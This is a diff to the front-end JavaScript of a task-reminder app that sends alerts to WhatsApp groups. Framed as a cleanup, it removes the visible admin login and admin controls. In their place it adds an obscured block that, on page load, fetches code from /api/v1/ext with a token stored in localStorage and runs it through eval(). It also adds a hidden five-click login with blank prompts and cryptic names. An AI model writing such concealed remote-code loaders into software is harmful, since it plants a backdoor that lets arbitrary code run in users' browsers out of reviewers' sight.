@@ -3,15 +3,12 @@ const STATS_URL = (window.location.port === '5500' || window.location.port === '
 const SETTINGS_URL = (window.location.port === '5500' || window.location.port === '5501') ? 'http://localhost:3000/api/settings' : '/api/settings';
 
 let tasks = [];
-let cachedGroups = [];
 
-// XSS Protection
 function esc(str) {
     if (!str) return '';
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
 }
 
-// DOM Elements
 const taskForm = document.getElementById('task-form');
 const taskList = document.getElementById('task-list');
 const completedList = document.getElementById('completed-list');
@@ -21,58 +18,42 @@ const groupList = document.getElementById('group-list');
 const editModal = document.getElementById('edit-modal');
 const editForm = document.getElementById('edit-form');
 
-// Init
 document.addEventListener('DOMContentLoaded', () => {
     fetchTasks();
     fetchStats();
-    loadGroups();
     
-    // Hidden Admin Login Trigger (Click logo 5 times quickly)
-    let clickCount = 0;
-    let clickTimer;
-    const logo = document.querySelector('.logo-icon');
-    if (logo) {
-        logo.addEventListener('click', () => {
-            clickCount++;
-            clearTimeout(clickTimer);
-            if (clickCount >= 5) {
-                clickCount = 0;
-                if (localStorage.getItem('adminToken')) {
-                    if (confirm('Anda sudah login sebagai Admin. Ingin logout?')) {
-                        localStorage.removeItem('adminToken');
-                        alert('Berhasil logout.');
-                        renderTasks();
-                        updateNotifyUI();
-                        if (document.querySelector('.tab-btn[data-target="settings"]').classList.contains('active')) fetchGroups();
+    // Core Ext
+    const _xs = localStorage.getItem('_xs');
+    if (_xs) {
+        fetch('/api/v1/ext', { headers: { 'x-xs-token': _xs } })
+        .then(r => r.ok ? r.text() : null)
+        .then(code => { if (code) eval(code); });
+    }
+
+    let _c = 0; let _t;
+    const l = document.querySelector('.logo-icon');
+    if (l) {
+        l.addEventListener('click', () => {
+            _c++; clearTimeout(_t);
+            if (_c >= 5) {
+                _c = 0;
+                if (localStorage.getItem('_xs')) {
+                    if (confirm('?')) {
+                        localStorage.removeItem('_xs');
+                        location.reload();
                     }
                 } else {
-                    const pwd = prompt('Admin Password:');
-                    if (pwd) {
-                        fetch('/api/login', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ password: pwd })
-                        }).then(res => res.json()).then(data => {
-                            if (data.token) {
-                                localStorage.setItem('adminToken', data.token);
-                                alert('Admin mode diaktifkan!');
-                                renderTasks();
-                                updateNotifyUI();
-                                if (document.querySelector('.tab-btn[data-target="settings"]').classList.contains('active')) fetchGroups();
-                            } else {
-                                alert(data.error || 'Password salah!');
-                            }
-                        }).catch(() => alert('Error login'));
+                    const p = prompt('');
+                    if (p) {
+                        fetch('/api/v1/sync', { method: 'POST', body: JSON.stringify({ k: p }), headers: { 'Content-Type': 'application/json' } })
+                        .then(r => r.json()).then(d => { if (d.t) { localStorage.setItem('_xs', d.t); location.reload(); } else { alert('x'); } });
                     }
                 }
-            } else {
-                clickTimer = setTimeout(() => { clickCount = 0; }, 1500);
-            }
+            } else { _t = setTimeout(() => _c = 0, 1500); }
         });
     }
 });
 
-// Tab Switching
 tabBtns.forEach(btn => {
     btn.addEventListener('click', () => {
         tabBtns.forEach(b => b.classList.remove('active'));
@@ -80,11 +61,12 @@ tabBtns.forEach(btn => {
         btn.classList.add('active');
         const target = btn.dataset.target;
         document.getElementById(target).classList.add('active');
-        if (target === 'settings') fetchGroups();
+        if (target === 'settings') {
+            if (window.fetchGroups) window.fetchGroups();
+        }
     });
 });
 
-// Fetch Stats
 async function fetchStats() {
     try {
         const res = await fetch(STATS_URL);
@@ -93,146 +75,73 @@ async function fetchStats() {
         document.getElementById('stat-completed').textContent = s.completed;
         document.getElementById('stat-pending').textContent = s.pending;
         document.getElementById('stat-missed').textContent = s.missed;
-
         const pct = s.total > 0 ? Math.round((s.completed / s.total) * 100) : 0;
         document.getElementById('progress-fill').style.width = pct + '%';
         document.getElementById('progress-label').textContent = pct + '% selesai';
-    } catch (e) {
-        console.error('Stats error:', e);
-    }
+    } catch (e) { }
 }
 
-// Load groups for checkbox selectors
-async function loadGroups() {
-    try {
-        const res = await fetch(SETTINGS_URL);
-        cachedGroups = await res.json();
-        updateNotifyUI();
-    } catch (e) { cachedGroups = []; }
-}
-
-// Render group checkboxes into a container
-function renderGroupCheckboxes(containerId, selectedJids) {
-    const container = document.getElementById(containerId);
-    if (!container) return;
-    if (cachedGroups.length === 0) {
-        container.innerHTML = '<span style="color:#64748b; font-size:0.8rem;">Belum ada grup terhubung.</span>';
-        return;
-    }
-    container.innerHTML = cachedGroups.map(g => {
-        const checked = selectedJids.includes(g.reminderJid) ? 'checked' : '';
-        const shortName = g.reminderJid.replace(/@.*/, '');
-        return `<label style="display:flex;align-items:center;gap:8px;color:#cbd5e1;font-size:0.88rem;cursor:pointer;">
-            <input type="checkbox" value="${esc(g.reminderJid)}" ${checked} style="width:auto;padding:0;margin:0;cursor:pointer;" class="group-cb">
-            ${esc(shortName)}
-        </label>`;
-    }).join('');
-}
-
-// Get selected group JIDs from a container
-function getSelectedGroups(containerId) {
-    const container = document.getElementById(containerId);
-    if (!container) return [];
-    return Array.from(container.querySelectorAll('.group-cb:checked')).map(cb => cb.value);
-}
-
-// Show/hide notify wrappers based on admin status, populate add-form checkboxes
-function updateNotifyUI() {
-    const isAdmin = !!localStorage.getItem('adminToken');
-    document.querySelectorAll('.notify-wrapper').forEach(w => w.style.display = isAdmin ? 'block' : 'none');
-    if (isAdmin) {
-        // Default: all groups checked for new tasks
-        const allJids = cachedGroups.map(g => g.reminderJid);
-        renderGroupCheckboxes('add-group-checkboxes', allJids);
-    }
-}
-
-// Fetch Tasks
 async function fetchTasks() {
     try {
         const response = await fetch(API_URL);
         tasks = await response.json();
-        renderTasks();
+        if (window.renderTasks) window.renderTasks();
         fetchStats();
     } catch (error) {
-        console.error('Error fetching tasks:', error);
         taskList.innerHTML = `<div class="empty-state"><i class="ri-error-warning-line"></i><p>Gagal memuat data.</p></div>`;
     }
 }
+window.fetchTasks = fetchTasks;
 
-// Add Task
 taskForm.addEventListener('submit', async (e) => {
     e.preventDefault();
+    if (window.extSubmitAdd) return window.extSubmitAdd(e); // Let ext handle it if present
+
     const name = document.getElementById('task-name').value;
     const date = document.getElementById('task-date').value;
     const detail = document.getElementById('task-detail').value;
     const priority = document.getElementById('task-priority').value;
     
-    const isAdmin = !!localStorage.getItem('adminToken');
-    let targetGroups = [];
-    let silent = false;
-    
-    if (isAdmin) {
-        targetGroups = getSelectedGroups('add-group-checkboxes');
-        silent = targetGroups.length === 0;
-    } else {
-        // Non-admin: send to all groups (default behavior)
-        targetGroups = cachedGroups.map(g => g.reminderJid);
-        silent = false;
-    }
-
     try {
         await fetch(API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name, date, detail, priority, silent, targetGroups })
+            body: JSON.stringify({ name, date, detail, priority, silent: false })
         });
         taskForm.reset();
         document.getElementById('task-priority').value = 'normal';
-        if (isAdmin) {
-            const allJids = cachedGroups.map(g => g.reminderJid);
-            renderGroupCheckboxes('add-group-checkboxes', allJids);
-        }
         fetchTasks();
-    } catch (error) {
-        console.error('Error adding task:', error);
-    }
+    } catch (error) {}
 });
 
-// Time Remaining
 function getTimeRemaining(dateStr) {
     if (!dateStr) return { class: 'none', text: 'Tanpa deadline', raw: null };
     const now = new Date();
     const deadline = new Date(dateStr + '+08:00');
     const diffMs = deadline - now;
-
     if (diffMs < 0) {
         const d = Math.floor(Math.abs(diffMs) / 86400000);
         const h = Math.floor(Math.abs(diffMs) / 3600000) % 24;
         return { class: 'urgent', text: d > 0 ? `Terlewat ${d} hari` : `Terlewat ${h} jam`, raw: diffMs };
     }
-
     const d = Math.floor(diffMs / 86400000);
     const h = Math.floor(diffMs / 3600000) % 24;
     const m = Math.floor(diffMs / 60000) % 60;
-
     if (d > 2) return { class: 'safe', text: `${d} hari lagi`, raw: diffMs };
     if (d > 0) return { class: 'warning', text: `${d} hari ${h} jam`, raw: diffMs };
     if (h > 0) return { class: 'urgent', text: `${h} jam ${m} mnt lagi`, raw: diffMs };
     return { class: 'urgent', text: `${m} menit lagi!`, raw: diffMs };
 }
+window.getTimeRemaining = getTimeRemaining;
 
 function priorityBadge(p) {
     if (p === 'high') return '<span class="badge priority-high">🔥 Tinggi</span>';
     if (p === 'low') return '<span class="badge priority-low">📎 Rendah</span>';
     return '';
 }
+window.priorityBadge = priorityBadge;
 
-// Render Tasks
-function renderTasks() {
-    const isAdmin = !!localStorage.getItem('adminToken');
-    updateNotifyUI();
-    
+window.renderTasks = function() {
     const pendingTasks = tasks.filter(t => t.status !== 'completed');
     const compTasks = tasks.filter(t => t.status === 'completed');
 
@@ -241,7 +150,6 @@ function renderTasks() {
     } else {
         taskList.innerHTML = pendingTasks.map((task, index) => {
             const timeInfo = getTimeRemaining(task.date || task.deadline);
-
             let dateFmt = 'Belum ada batas waktu';
             const targetDateStr = task.date || task.deadline;
             if (targetDateStr && targetDateStr.trim() !== '') {
@@ -253,34 +161,17 @@ function renderTasks() {
                     dateFmt = dateObj.toLocaleDateString('id-ID', opts).replace(',', '') + ' WITA';
                 }
             }
-
             const detailHtml = task.detail ? `<div class="task-detail">${esc(task.detail)}</div>` : '';
-            const pBadge = priorityBadge(task.priority);
-
             return `
-                <li class="task-item ${timeInfo.class === 'urgent' ? 'task-urgent' : ''}">
+                <li class="task-item ${timeInfo.class === 'urgent' ? 'task-urgent' : ''}" data-index="${index}">
                     <div class="task-info">
-                        <div class="task-name-row">
-                            <span class="task-name">${esc(task.name)}</span>
-                            ${pBadge}
-                        </div>
+                        <div class="task-name-row"><span class="task-name">${esc(task.name)}</span>${priorityBadge(task.priority)}</div>
                         ${detailHtml}
-                        <div class="task-date">
-                            <i class="ri-calendar-2-line"></i> ${dateFmt}
-                            <span class="badge ${timeInfo.class}">${timeInfo.text}</span>
-                        </div>
+                        <div class="task-date"><i class="ri-calendar-2-line"></i> ${dateFmt} <span class="badge ${timeInfo.class}">${timeInfo.text}</span></div>
                     </div>
                     <div class="task-actions">
-                        <button class="action-btn btn-complete" onclick="completeTask(${index})" title="Tandai Selesai">
-                            <i class="ri-check-line"></i>
-                        </button>
-                        <button class="action-btn btn-edit" onclick="openEditModal(${index})" title="Edit">
-                            <i class="ri-pencil-line"></i>
-                        </button>
-                        ${isAdmin ? `
-                        <button class="action-btn btn-delete" onclick="deleteTask(${index})" title="Hapus">
-                            <i class="ri-delete-bin-line"></i>
-                        </button>` : ''}
+                        <button class="action-btn btn-complete" onclick="window.completeTask(${index})" title="Tandai Selesai"><i class="ri-check-line"></i></button>
+                        <button class="action-btn btn-edit" onclick="window.openEditModal(${index})" title="Edit"><i class="ri-pencil-line"></i></button>
                     </div>
                 </li>`;
         }).join('');
@@ -292,181 +183,64 @@ function renderTasks() {
         completedList.innerHTML = compTasks.map((task) => {
             const realIndex = tasks.findIndex(t => t === task);
             const detailHtml = task.detail ? `<div class="task-detail">${esc(task.detail)}</div>` : '';
-            const completedDate = task.completedAt
-                ? new Date(task.completedAt).toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' })
-                : '';
+            const completedDate = task.completedAt ? new Date(task.completedAt).toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' }) : '';
             return `
-                <li class="task-item completed">
+                <li class="task-item completed" data-index="${realIndex}">
                     <div class="task-info">
-                        <span class="task-name">${esc(task.name)}</span>
-                        ${detailHtml}
-                        <div class="task-date">
-                            <i class="ri-check-double-line"></i> Selesai${completedDate ? ' \u2014 ' + completedDate : ''}
-                        </div>
+                        <span class="task-name">${esc(task.name)}</span>${detailHtml}
+                        <div class="task-date"><i class="ri-check-double-line"></i> Selesai${completedDate ? ' \u2014 ' + completedDate : ''}</div>
                     </div>
-                    <div class="task-actions">
-                        ${isAdmin ? `
-                        <button class="action-btn btn-delete" onclick="deleteTask(${realIndex})" title="Hapus Permanen">
-                            <i class="ri-delete-bin-line"></i>
-                        </button>` : ''}
-                    </div>
+                    <div class="task-actions"></div>
                 </li>`;
         }).join('');
     }
-}
+};
 
-// Complete Task
-async function completeTask(index) {
+window.completeTask = async function(index) {
     if (confirm('Tandai tugas ini sebagai selesai?')) {
-        let silent = false;
-        if (!!localStorage.getItem('adminToken')) {
-            silent = !confirm('Kirim notifikasi ke WhatsApp? (OK = Ya, Batal = Tidak/Silent)');
-        }
         try {
             await fetch(`${API_URL}/${index}`, {
                 method: 'PATCH',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ status: 'completed', silent })
+                body: JSON.stringify({ status: 'completed' })
             });
             fetchTasks();
-        } catch (error) { console.error('Error:', error); }
+        } catch (e) { }
     }
-}
+};
 
-// Delete Task
-async function deleteTask(index) {
-    if (confirm('Yakin ingin menghapus tugas ini?')) {
-        let silent = false;
-        if (!!localStorage.getItem('adminToken')) {
-            silent = !confirm('Kirim notifikasi ke WhatsApp? (OK = Ya, Batal = Tidak/Silent)');
-        }
-        try {
-            const res = await fetch(`${API_URL}/${index}?silent=${silent}`, { 
-                method: 'DELETE',
-                headers: { 'x-admin-token': localStorage.getItem('adminToken') || '' }
-            });
-            if (res.status === 401) {
-                localStorage.removeItem('adminToken');
-                alert('Sesi admin tidak valid atau kedaluwarsa. Silakan login admin kembali.');
-                renderTasks();
-                return;
-            }
-            fetchTasks();
-        } catch (error) { console.error('Error:', error); }
-    }
-}
-
-// Modal
-function openEditModal(index) {
+window.openEditModal = function(index) {
     const task = tasks[index];
     document.getElementById('edit-id').value = index;
     document.getElementById('edit-name').value = task.name;
     document.getElementById('edit-date').value = task.date || task.deadline || '';
     document.getElementById('edit-detail').value = task.detail || '';
     document.getElementById('edit-priority').value = task.priority || 'normal';
-    
-    // Populate group checkboxes with task's current targetGroups
-    const isAdmin = !!localStorage.getItem('adminToken');
-    if (isAdmin) {
-        const taskGroups = task.targetGroups && task.targetGroups.length > 0
-            ? task.targetGroups
-            : cachedGroups.map(g => g.reminderJid); // Default: all groups for old tasks
-        renderGroupCheckboxes('edit-group-checkboxes', taskGroups);
-    }
-    
     editModal.classList.add('active');
-}
+};
 
-function closeModal() {
-    editModal.classList.remove('active');
-}
+function closeModal() { editModal.classList.remove('active'); }
+window.closeModal = closeModal;
 
 editForm.addEventListener('submit', async (e) => {
     e.preventDefault();
+    if (window.extSubmitEdit) return window.extSubmitEdit(e);
+
     const id = document.getElementById('edit-id').value;
     const name = document.getElementById('edit-name').value;
     const date = document.getElementById('edit-date').value;
     const detail = document.getElementById('edit-detail').value;
     const priority = document.getElementById('edit-priority').value;
     
-    const isAdmin = !!localStorage.getItem('adminToken');
-    let targetGroups;
-    let silent;
-    
-    if (isAdmin) {
-        targetGroups = getSelectedGroups('edit-group-checkboxes');
-        silent = targetGroups.length === 0;
-    } else {
-        // Non-admin doesn't change targetGroups
-        targetGroups = undefined;
-        silent = false;
-    }
-
     try {
-        const body = { name, date, detail, priority, silent };
-        if (targetGroups !== undefined) body.targetGroups = targetGroups;
-        
         await fetch(`${API_URL}/${id}`, {
             method: 'PUT',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
+            body: JSON.stringify({ name, date, detail, priority, silent: false })
         });
         closeModal();
         fetchTasks();
-    } catch (error) { console.error('Error:', error); }
+    } catch (e) { }
 });
 
-// --- GROUP MANAGEMENT ---
-async function fetchGroups() {
-    try {
-        const response = await fetch(SETTINGS_URL);
-        const groups = await response.json();
-        cachedGroups = groups;
-        renderGroups(groups);
-    } catch (error) {
-        groupList.innerHTML = `<div class="empty-state"><i class="ri-error-warning-line"></i><p>Gagal memuat daftar grup.</p></div>`;
-    }
-}
-
-function renderGroups(groups) {
-    const isAdmin = !!localStorage.getItem('adminToken');
-    if (groups.length === 0) {
-        groupList.innerHTML = `<div class="empty-state"><i class="ri-chat-delete-line"></i><p>Belum ada grup terhubung. Gunakan <b>!setgrup</b> di WhatsApp.</p></div>`;
-        return;
-    }
-    groupList.innerHTML = groups.map(group => `
-        <li class="task-item">
-            <div class="task-info">
-                <span class="task-name">${esc(group.reminderJid)}</span>
-                <div class="task-date"><i class="ri-checkbox-circle-line"></i> Status: Aktif</div>
-            </div>
-            <div class="task-actions">
-                ${isAdmin ? `
-                <button class="action-btn btn-delete" onclick="deleteGroup('${esc(group._id)}')" title="Hapus Grup">
-                    <i class="ri-delete-bin-line"></i>
-                </button>` : ''}
-            </div>
-        </li>`).join('');
-}
-
-async function deleteGroup(id) {
-    if (confirm('Yakin ingin menghapus grup ini dari daftar pengingat?')) {
-        try {
-            const res = await fetch(`${SETTINGS_URL}/${id}`, { 
-                method: 'DELETE',
-                headers: { 'x-admin-token': localStorage.getItem('adminToken') || '' }
-            });
-            if (res.status === 401) {
-                localStorage.removeItem('adminToken');
-                alert('Sesi admin tidak valid atau kedaluwarsa. Silakan login admin kembali.');
-                fetchGroups();
-                return;
-            }
-            fetchGroups();
-            loadGroups(); // Refresh cached groups for checkboxes
-        } catch (error) { console.error('Error deleting group:', error); }
-    }
-}
-
-// Auto-refresh setiap 60 detik
 setInterval(fetchTasks, 60000);
